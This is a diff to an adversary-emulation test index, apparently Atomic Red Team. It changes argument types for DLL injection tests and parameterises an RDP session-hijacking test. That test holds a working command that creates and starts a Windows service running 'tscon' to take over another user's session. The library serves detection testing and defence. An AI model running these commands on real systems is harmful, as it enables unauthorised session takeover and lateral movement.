@@ -10852,7 +10852,7 @@ defense-evasion:
           default: explorer
         dll_path:
           description: Path of the dll to inject
-          type: string
+          type: path
           default: PathToAtomicsFolder\T1502\bin\calc.dll
         dll_process_name:
           description: Name of the created process from the injected dll
@@ -10860,7 +10860,7 @@ defense-evasion:
           default: calculator
         spawnto_process_path:
           description: Path of the process to spawn
-          type: string
+          type: path
           default: C:\Program Files\Internet Explorer\iexplore.exe
         spawnto_process_name:
           description: Name of the process to spawn
@@ -14780,7 +14780,7 @@ privilege-escalation:
           default: explorer
         dll_path:
           description: Path of the dll to inject
-          type: string
+          type: path
           default: PathToAtomicsFolder\T1502\bin\calc.dll
         dll_process_name:
           description: Name of the created process from the injected dll
@@ -14788,7 +14788,7 @@ privilege-escalation:
           default: calculator
         spawnto_process_path:
           description: Path of the process to spawn
-          type: string
+          type: path
           default: C:\Program Files\Internet Explorer\iexplore.exe
         spawnto_process_name:
           description: Name of the process to spawn
@@ -26403,7 +26403,7 @@ lateral-movement:
       modified: '2019-07-18T17:46:11.999Z'
       identifier: T1076
     atomic_tests:
-    - name: RDP
+    - name: RDP hijacking
       description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
         - how to hijack RDS and RemoteApp sessions transparently to move through an
         organization
@@ -26411,12 +26411,21 @@ lateral-movement:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        Session_ID:
+          description: The ID of the session to which you want to connect
+          type: String
+          default: 1337
+        Destination_ID:
+          description: Connect the session of another user to a different session
+          type: String
+          default: rdp-tcp#55
       executor:
         name: command_prompt
         elevation_required: true
         command: |
           query user
-          sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
+          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
           net start sesshijack
         cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
 
